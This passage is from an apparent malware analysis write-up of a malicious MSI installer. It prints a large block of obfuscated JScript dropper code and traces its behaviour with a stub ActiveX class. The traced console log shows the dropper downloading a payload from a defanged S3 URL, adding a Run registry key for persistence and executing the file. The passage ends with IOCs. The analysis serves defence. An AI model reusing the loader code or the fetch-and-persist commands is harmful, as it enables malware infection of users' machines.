8LTDm6hEM8SHA3Z6J);if(yoQQ6c6gC6pzybirokybrML6FV5se3vdqobt6FUQWF1F0IvpJGwZ1e[_0x179b37(0x206)](strneosorocontinuojacto)){var obbXeyXepAMeX4NSLNzGmzioQAuIVuUSG2Qb6wOa14ykqUXfa5SCNXH=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xab)),eh7GxDPGLdaVeBcdzwFh8ELBiKzMXurh1eEtpDgeAHCHLKLpgfeC=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xd0));nK4d3ZVQju0cDl7ykfCjGkzgztfu1djjqVSJt3dorumqBi755b5txf2Nzc[_0x179b37(0x20a)](DfEDQVCSiTdOV9zCgViH1eZu1X8gtHTjI17oa14nr0E9zyULNOjKGx+obbXeyXepAMeX4NSLNzGmzioQAuIVuUSG2Qb6wOa14ykqUXfa5SCNXH+eh7GxDPGLdaVeBcdzwFh8ELBiKzMXurh1eEtpDgeAHCHLKLpgfeC);}else{try{var gSadymzHb0nqgTpDf83kJzpgJ2mACjM33JexOXC7RaiFUC679O1mc=yoQQ6c6gC6pzybirokybrML6FV5se3vdqobt6FUQWF1F0IvpJGwZ1e[_0x5b187b(0xc9)](strneosorocontinuojacto,!![]);gSadymzHb0nqgTpDf83kJzpgJ2mACjM33JexOXC7RaiFUC679O1mc[_0x5b187b(0x9e)](_0x5b187b(0xc3)),gSadymzHb0nqgTpDf83kJzpgJ2mACjM33JexOXC7RaiFUC679O1mc[_0x179b37(0x205)]();}catch(_0x117af0){};yoQQ6c6gC6pzybirokybrML6FV5se3vdqobt6FUQWF1F0IvpJGwZ1e[_0x5b187b(0xc5)](WKgl1v6AthII56zr6j09uwB16HzVKkkVgUdvaRf7PvKhiMq91W1NRu);var DeJSnnU6cFlFExTd0yUnqsmn7YyvGfbnSdljn4UStZ0MNfdwJE399dGliS=WKgl1v6AthII56zr6j09uwB16HzVKkkVgUdvaRf7PvKhiMq91W1NRu+hh8aN6epbUcmBR3eXys5eGkYLpv614e2QqUVf2HCzdiVbcxsneOD5Xfe2d+gF5OaHC5Gqb1sRrGU3XnFtLhXDTR9XD69toip2mKxfTZB0KSQKAwNOhZ+Fa33kG2qcD71XUwNvHj2k016pDvSmPO6UdtkGSLkCeOU5jDmSEUy1DP;CdWB8pWOIMiCaOCzdFmmxvjlWIYif5jjp69mGcdAvheaKnEir8hLkVnS4Z(o9pC8Ho4LmBjLge0gd9kvcWZIxe9HKrFRwugn82ULsn3Q2i6VVrn8OxC6,DeJSnnU6cFlFExTd0yUnqsmn7YyvGfbnSdljn4UStZ0MNfdwJE399dGliS);var uPp7Vi5WJfGndyU0WiTWYD21OBf6GtoMbKWhL2tRQXxFXRGB7aNG=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xbe)),yApVXKvQkod8GDFpjP6GsYKjr1X2qYXW82JwQpBppJvpuF4oy2n3073aH=new ActiveXObject(uPp7Vi5WJfGndyU0WiTWYD21OBf6GtoMbKWhL2tRQXxFXRGB7aNG);EmMvH6KjFce3yG7EFy9O8oxoS7U260x5veSbp9jegDKSeeeWNSagBJgAt=yApVXKvQkod8GDFpjP6GsYKjr1X2qYXW82JwQpBppJvpuF4oy2n3073aH[_0x5b187b(0x9f)](DeJSnnU6cFlFExTd0yUnqsmn7YyvGfbnSdljn4UStZ0MNfdwJE399dGliS)[_0x179b37(0x1e1)]();var iMSGpci5LbuTLoHbIIStJNkEVmkhDcYDTEI5dSxfFxZ4FkKDN44JE5KcF1z=[];for(var i=0x0;i<EmMvH6KjFce3yG7EFy9O8oxoS7U260x5veSbp9jegDKSeeeWNSagBJgAt[_0x49a11f(0xa6)];i++){iMSGpci5LbuTLoHbIIStJNkEVmkhDcYDTEI5dSxfFxZ4FkKDN44JE5KcF1z[_0x5b187b(0x98)](EmMvH6KjFce3yG7EFy9O8oxoS7U260x5veSbp9jegDKSeeeWNSagBJgAt[_0x5b187b(0xac)](i)[_0x5b187b(0xc8)]),yApVXKvQkod8GDFpjP6GsYKjr1X2qYXW82JwQpBppJvpuF4oy2n3073aH[_0x5b187b(0x9f)](WKgl1v6AthII56zr6j09uwB16HzVKkkVgUdvaRf7PvKhiMq91W1NRu+hh8aN6epbUcmBR3eXys5eGkYLpv614e2QqUVf2HCzdiVbcxsneOD5Xfe2d)[_0x5b187b(0xcc)](EmMvH6KjFce3yG7EFy9O8oxoS7U260x5veSbp9jegDKSeeeWNSagBJgAt[_0x49a11f(0xa7)](i));}ckxNm77HX2tAtRpMQsWv1X3CHb6tdEt6Bez5zGiNnccsopIwseKK3JXum=t0ytlGKTYMbPE84LxFqFrqSWy1bMc2AV6T8gaXYNLXpV43BGoSpGPdI(0x7),wNL9gcqA0w8PiNdvosibTdQUah9kiLsTdTox48tLQY9fVg1mWwIe5Z=WKgl1v6AthII56zr6j09uwB16HzVKkkVgUdvaRf7PvKhiMq91W1NRu+hh8aN6epbUcmBR3eXys5eGkYLpv614e2QqUVf2HCzdiVbcxsneOD5Xfe2d+ckxNm77HX2tAtRpMQsWv1X3CHb6tdEt6Bez5zGiNnccsopIwseKK3JXum+E8A3z3gWwk8JrDOP8iE3W8g2xhbVKOD4d2G10qO2Y03W1geTmF2khrUla+WT1fM6T9y29aGKZxPx9gfp2Se8ayyJUM7URKedVzGIi1y1kZjkQ61ZXBWw;for(var i=0x0;i<iMSGpci5LbuTLoHbIIStJNkEVmkhDcYDTEI5dSxfFxZ4FkKDN44JE5KcF1z[_0x179b37(0x210)];i++){EmG8jU1JwNvDeZL6AZU4kF00WCgGoUbvEpmJocDyIevz3ENoJ5M=iMSGpci5LbuTLoHbIIStJNkEVmkhDcYDTEI5dSxfFxZ4FkKDN44JE5KcF1z[i],EmG8jU1JwNvDeZL6AZU4kF00WCgGoUbvEpmJocDyIevz3ENoJ5M[_0x5b187b(0xca)]('01')===0x0&&yoQQ6c6gC6pzybirokybrML6FV5se3vdqobt6FUQWF1F0IvpJGwZ1e[_0x5b187b(0xb5)](WKgl1v6AthII56zr6j09uwB16HzVKkkVgUdvaRf7PvKhiMq91W1NRu+hh8aN6epbUcmBR3eXys5eGkYLpv614e2QqUVf2HCzdiVbcxsneOD5Xfe2d+EmG8jU1JwNvDeZL6AZU4kF00WCgGoUbvEpmJocDyIevz3ENoJ5M,wNL9gcqA0w8PiNdvosibTdQUah9kiLsTdTox48tLQY9fVg1mWwIe5Z);}yoQQ6c6gC6pzybirokybrML6FV5se3vdqobt6FUQWF1F0IvpJGwZ1e[_0x5b187b(0xae)](WKgl1v6AthII56zr6j09uwB16HzVKkkVgUdvaRf7PvKhiMq91W1NRu+hh8aN6epbUcmBR3eXys5eGkYLpv614e2QqUVf2HCzdiVbcxsneOD5Xfe2d+gF5OaHC5Gqb1sRrGU3XnFtLhXDTR9XD69toip2mKxfTZB0KSQKAwNOhZ+Fa33kG2qcD71XUwNvHj2k016pDvSmPO6UdtkGSLkCeOU5jDmSEUy1DP,!![]);var btCsa5Bpvx2CbG9ChGcoajzZVWxskS9sy1YaEDJdbblmKKCHEkaRZk4GW7G,JRPJWrmKK3lPLrluFse0fa0USpadkDNSIH4S3BgjnLi5JTzNbdDRq,yCrV8mwBguDglPNW3IrTPfEm05D3nYJDfCJLPEphypz785fV91vC=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x179b37(0x1f5))+wNL9gcqA0w8PiNdvosibTdQUah9kiLsTdTox48tLQY9fVg1mWwIe5Z;yCrV8mwBguDglPNW3IrTPfEm05D3nYJDfCJLPEphypz785fV91vC+=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x179b37(0x211)),btCsa5Bpvx2CbG9ChGcoajzZVWxskS9sy1YaEDJdbblmKKCHEkaRZk4GW7G=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x179b37(0x1ee)),JRPJWrmKK3lPLrluFse0fa0USpadkDNSIH4S3BgjnLi5JTzNbdDRq=DfEDQVCSiTdOV9zCgViH1eZu1X8gtHTjI17oa14nr0E9zyULNOjKGx+btCsa5Bpvx2CbG9ChGcoajzZVWxskS9sy1YaEDJdbblmKKCHEkaRZk4GW7G+gF5OaHC5Gqb1sRrGU3XnFtLhXDTR9XD69toip2mKxfTZB0KSQKAwNOhZ,JRPJWrmKK3lPLrluFse0fa0USpadkDNSIH4S3BgjnLi5JTzNbdDRq+=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xa0))+yCrV8mwBguDglPNW3IrTPfEm05D3nYJDfCJLPEphypz785fV91vC,nK4d3ZVQju0cDl7ykfCjGkzgztfu1djjqVSJt3dorumqBi755b5txf2Nzc[_0x5b187b(0xb4)](JRPJWrmKK3lPLrluFse0fa0USpadkDNSIH4S3BgjnLi5JTzNbdDRq),btCsa5Bpvx2CbG9ChGcoajzZVWxskS9sy1YaEDJdbblmKKCHEkaRZk4GW7G=GZ8HhlXIx38yjwV3YTS2MrlgTrz2jdLf02aE6HUfjlKPHOIg4X0lpgP(_0x5b187b(0xc0)),JRPJWrmKK3lPLrluFse0fa0USpadkDNSIH4S3BgjnLi5JTzNbdDRq=btCsa5Bpvx2CbG9ChGcoajzZVWxskS9sy1YaEDJdbblmKKCHEkaRZk4GW7G+wNL9gcqA0w8PiNdvosibTdQUah9kiLsTdTox48tLQY9fVg1mWwIe5Z+btCsa5Bpvx2CbG9ChGcoajzZVWxskS9sy1YaEDJdbblmKKCHEkaRZk4GW7G,nK4d3ZVQju0cDl7ykfCjGkzgztfu1djjqVSJt3dorumqBi755b5txf2Nzc[_0x5b187b(0xb4)](JRPJWrmKK3lPLrluFse0fa0USpadkDNSIH4S3BgjnLi5JTzNbdDRq);}function _0xb6f0(){var _0x1f63f5=_0x49a11f,_0x1b0b83=[_0x1f63f5(0x80),_0x1f63f5(0xaa),_0x1f63f5(0xb0),'90AB78B169ED24DC73D0182FE2',_0x1f63f5(0x7c),'0B64ED47F024EE1FB772BD6BC1A75932',_0x1f63f5(0x86),_0x1f63f5(0x92),_0x1f63f5(0xa3),'6623544NqXotA',_0x1f63f5(0x7d),_0x1f63f5(0x73),_0x1f63f5(0xa9),_0x1f63f5(0x7b),_0x1f63f5(0x95),_0x1f63f5(0x84),_0x1f63f5(0x8a),_0x1f63f5(0xa2),_0x1f63f5(0xab),_0x1f63f5(0x76),_0x1f63f5(0x8b),_0x1f63f5(0x79),_0x1f63f5(0xb4),_0x1f63f5(0xb6),_0x1f63f5(0xa5),_0x1f63f5(0x9a),_0x1f63f5(0x9c),_0x1f63f5(0xb3),_0x1f63f5(0x70),_0x1f63f5(0x99),'Item',_0x1f63f5(0x7e),_0x1f63f5(0x8d),_0x1f63f5(0x94),'FileExists',_0x1f63f5(0x88),'20CbbKMs',_0x1f63f5(0x85),'Run','substr','Open','E17CB673973DC978D75AD044E7033DDB3BF658FF0203151536D73E',_0x1f63f5(0x6f),_0x1f63f5(0x90),_0x1f63f5(0x81),'2ACF98','CreateTextFile','Write',_0x1f63f5(0x74),'182861NLAkXA',_0x1f63f5(0xb2),_0x1f63f5(0x87),_0x1f63f5(0x93),_0x1f63f5(0x9f),_0x1f63f5(0xa1),_0x1f63f5(0xa8),_0x1f63f5(0x72),_0x1f63f5(0x9d),'14530ZIfeqx',_0x1f63f5(0x8c),_0x1f63f5(0x78),_0x1f63f5(0x71),_0x1f63f5(0x91),_0x1f63f5(0x6d)];return _0xb6f0=function(){return _0x1b0b83;},_0xb6f0();}function _0x4a8b(_0x1dda66,_0x3db024){var _0x502e70=_0xb6f0();return _0x4a8b=function(_0x7b6973,_0x2d354c){_0x7b6973=_0x7b6973-0x1da;var _0x362908=_0x502e70[_0x7b6973];return _0x362908;},_0x4a8b(_0x1dda66,_0x3db024);}function _0xed65(){var _0x419c40=['C7BC5E9D45','BD6F8AA45EE467DD3CCD77B65190558D6D8A8BBC80FC12ED5780974DA08BD08F9B6E8530CC78E12CC7AF46FC036895C3558ADA2CC8A5509F41','0378B578AF','CopyHere','A95BA641FA5BED56B4738FAF5E9A47FE052CBE61E010041937D273906188DB4FD3251EBA77AE2C2EF80430DD2AC660F62EDB7FBB7FB359EB0B27E80A4BFC1E2DE93C26C54CF7','2360183uHksOu','SaveToFile','fromCharCode','63VBoAGi','370740XbWtlZ','Close','1605908VPhuos','6ygNBDC','1493016wlPOIC','342284DNHauZ','86FD','600850SgaEiD','D379','69daiMtS','90AE718586CF3CE7271BDC182AC96B908CA928DF2ACF340871D171','1617gujeUX','4310185lInasO','318430LCpSZt','63C15E8BBB1BF118B47FFC','EA44C9B1','Name','D2BE6681A820F11E72','556eqpwFs','Count','Item','CreateFolder','5EFB1CD677','C3B877B550','IiZK5xK1eXSJWUKnX3BoRpjLNrFaFlqkgJ0SC8uXZU','15YANViJ','198E','DeleteFile','charCodeAt','push','8RaUKGg','Send','2499552KVTwKf','183dQLsLH','NULL','28040E27DF66AE5FF37C','floor','67DC38EA14','indexOf','1456428FBxITU','34CE5E994D8CC24F8E9B50EA0432F316EB02','items','228130QxKCBb','random','MoveFile','87B742FF399770AFEC0535C97CBF','0C0D','WriteLine','6hPdQaO','18785dTssqZ','8646165nrgSLd','Status','13558490gEgMxc','2C055DFA50F6133F8091E94ADD70EB47D765FF62AC43D79DA9BA8FA29FB468DF5FD1599BB353987782AE4BF70E2EE973B257F43CF338E169F924F833AB58A3AB61B9618481A967FF19F67CCC091968','shift','233304KFNMzs','ExpandEnvironmentStrings','length','9332384LMZrIA','NameSpace','D051FF0E','0F7DB9699739E61F52A1539A4A38','120snNMWa','4029312E054DB950F30D75F70F070A61','A0A8858E99EE65F359AE4CFE26','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789'];_0xed65=function(){return _0x419c40;};return _0xed65();}function _0x2e30(){var _0x124c7f=_0x49a11f,_0x4354e4=_0x179b37,_0x2145c4=[_0x4354e4(0x1da),_0x4354e4(0x1dd),_0x4354e4(0x1f0),_0x4354e4(0x219),_0x124c7f(0x77),_0x124c7f(0x83),_0x4354e4(0x1e9),'437483EbdujA',_0x4354e4(0x1ef),_0x4354e4(0x20f),_0x4354e4(0x1eb),_0x4354e4(0x1e3),_0x4354e4(0x1fd),_0x124c7f(0x75),_0x4354e4(0x20d),_0x4354e4(0x210),_0x124c7f(0xa4),_0x4354e4(0x217),_0x4354e4(0x202),_0x4354e4(0x1e2),_0x124c7f(0xae),_0x4354e4(0x215),_0x4354e4(0x1e4),_0x4354e4(0x1df),_0x4354e4(0x1e5),'13058WnQhpp',_0x4354e4(0x20a),_0x4354e4(0x214),_0x4354e4(0x1f8),_0x4354e4(0x1fb),_0x4354e4(0x1f7),_0x124c7f(0x9b),_0x4354e4(0x1fe),_0x124c7f(0x89),_0x4354e4(0x216),_0x124c7f(0xaf),_0x4354e4(0x200),_0x4354e4(0x1f1),'137C',_0x4354e4(0x1f6),_0x4354e4(0x1e0),_0x124c7f(0xb5),_0x4354e4(0x207),_0x4354e4(0x1db),_0x4354e4(0x1f4),_0x4354e4(0x1f3),_0x4354e4(0x1ec),_0x4354e4(0x212),_0x124c7f(0x6e),_0x4354e4(0x1ed),_0x4354e4(0x204),_0x4354e4(0x1f2),_0x4354e4(0x201),_0x4354e4(0x20b),_0x124c7f(0x8e),_0x4354e4(0x20c),_0x4354e4(0x209),_0x4354e4(0x1e6),_0x4354e4(0x1e7)];return _0x2e30=function(){return _0x2145c4;},_0x2e30();}
AI_CORRECT_INSTALL	51	AI_INSTALL	{}
AI_SET_RESUME	51	AI_RESUME	1
AI_SET_INSTALL	51	AI_INSTALL	1
AI_SET_MAINT	51	AI_MAINT	1
AI_SET_PATCH	51	AI_PATCH	1
```

15) We see severla references to `new ActiveXObject` . This means that this payload will not work in a modern browser. When Microsoft launched Edge in 2015 it stopped enabling it in the browser by default. Nevertheless ActiveX is still supported by the OS. As the payload is executed by an MSI, it will succeed.


16) A crude way to analyze the Javascript is to create an empty ActiveX class and execute it step by step in a browser. I appended this to the script and executed it in a browser. 

```javascript
class File {
    constructor(filename, overwrite) {  
        this.filename = filename; 
        this.overwrite = overwrite;
        console.log("Initiated File" );
    }
    WriteLine(env)
    {
        console.log("File: " + this.filename + " WriteLine: " + env);
    }
    Close() {
        console.log("File: " + this.filename + " Close " );
    }
}
class ActiveXObject {
    constructor(type) {
        this.type = type;
        console.log("Initiated ActiveXObject type " + type );
    }
    //ActiveXObject wscript.shell
    ExpandEnvironmentStrings(env) {
        console.log(this.type + " ExpandEnvironmentStrings: " + env);
        let result = env.replace(/%/g, "_");
        return result;
    }
    Run(env) {
        console.log(this.type + " Run: " + env);
    }   
    Echo(env) {
        console.log(this.type + " Echo: " + env);
    } 
    items(env) {
        console.log(this.type + " items: " + env);
        return "Some_Items";
    } 
    //ActiveXObject Scripting.FileSystemObject
    FileExists(env) {
        console.log(this.type + " FileExists: " + env);
    }  
    CreateFolder(env) {
        console.log(this.type + " CreateFolder: " + env);
    } 
    CreateTextFile(filename, overwrite) {
        console.log(this.type + " CreateTextFile: " + filename);
        return new File(filename, overwrite);
    } 
    NameSpace(env) {
        console.log(this.type + " NameSpace: [" + env + "]");
    } 
    DeleteFile(env) {
        console.log(this.type + " DeleteFile: " + env);
    }  
    SaveToFile(env) {
        console.log(this.type + " SaveToFile: " + env);
    } 
    MoveFile(source, dest) {
        console.log(this.type + " MoveFile: " + source + " to " + dest);
    } 
    Close() {
        console.log(this.type + " Close: " );
    }   

    //ActiveXObject WinHttpRequest
    Open(method, url, flag) {
        console.log(this.type + " Open: " + method + " " + url);
        return 0
    } 
    Send() {
        console.log(this.type + " Send: ");
    } 
    SetTimeouts(env) {
        console.log(this.type + " SetTimeouts: " + env);
    }   

    Write(env) {
        console.log(this.type + " Write: " + env);
    }
    Extract(env) {
        console.log(this.type + " Extract: " + env);
    }         
```
This patch prints all the ActiveX interactions, allowing us to capture what this script would do if executed by the MSI. You can find the patched script at `patched_js.html`.

This is the output of the JavaScript console:

```
Start
Initiated ActiveXObject type wscript.shell
wscript.shell ExpandEnvironmentStrings: %username%
wscript.shell ExpandEnvironmentStrings: %SystemDrive%
Initiated ActiveXObject type Scripting.FileSystemObject
wscript.shell ExpandEnvironmentStrings: %Public%
wscript.shell ExpandEnvironmentStrings: %comspec%
Scripting.FileSystemObject FileExists: _Public_\_username_
Scripting.FileSystemObject CreateTextFile: _Public_\_username_
Initiated File
File: _Public_\_username_ WriteLine: NULL
File: _Public_\_username_ Close 
Scripting.FileSystemObject CreateFolder: _SystemDrive_\_username_Iq8Ft®
Initiated ActiveXObject type WinHttp.WinHttpRequest.5.1
WinHttp.WinHttpRequest.5.1 SetTimeouts: 30000
WinHttp.WinHttpRequest.5.1 Open: GET https://landvoque.s3.eu-west-1.amazonaws[.]com/vailand.txt
WinHttp.WinHttpRequest.5.1 Send: 
Initiated ActiveXObject type ADODB.Stream
ADODB.Stream Open: undefined undefined
ADODB.Stream Write: undefined
ADODB.Stream SaveToFile: _SystemDrive_\_username_Iq8Ft®\_username_Iq8Ft®.zip
ADODB.Stream Close: 
Initiated ActiveXObject type Shell.Application
Scripting.FileSystemObject DeleteFile: _SystemDrive_\_username_Iq8Ft®\_username_Iq8Ft®.zip
wscript.shell Run: _comspec_ /C start /MIN reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "_username_Iq8Ft®" /t reg_sz /d "\"_SystemDrive_\_username_Iq8Ft®\6KrnZQD8.exe\"
wscript.shell Run: "_SystemDrive_\_username_Iq8Ft®\6KrnZQD8.exe"
End
```
17) The patch is very basic and does not reproduce all ActiveX classes ad methods but with some debugging, it provides a good understanding of the functionality:

* It looks for the local variables to identify the username, folder locations and the command line interpreter.
* Verifys it can write to a public folder and if not it creates a new one in the user path.
* Downloads a file from https://landvoque.s3.eu-west-1.amazonaws[.]com/vailand.txt
* This should be a zipped file containing an exe
*  A registry key is added to: `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` to ensure the executable is run at boot.
* It executes the file.

18) Unfortunatelly the exe  hosted in https://landvoque.s3.eu-west-1.amazonaws[.]com/vailand.txt is not available anymore.

19) If we execute the MSI in a controlled environment we can see it is accessing `landvoque.s3.eu-west-1.amazonaws[.]com` confirming the finding.

```
Name: landvoque.s3.eu-west-1.amazonaws[.]com
Address: 52.218.121.90
```
20) We can also see an analysis done in Joesandbox.com for the same payload that confirms the behaviour:

![Joe Sandbox](./images/joesandbox.com.png?raw=true "Joe Sandbox")


---
### IOCs

|   |   |
|---|---|
| landvoque.s3.eu-west-1.amazonaws[.]com  |  52.218.52[.]163 |
|  QDHCSENZCHICEZI�.msi | a1bc36ad91480fef29677d4499805fd5fb94375885754689e88df3bd7e49966c  |

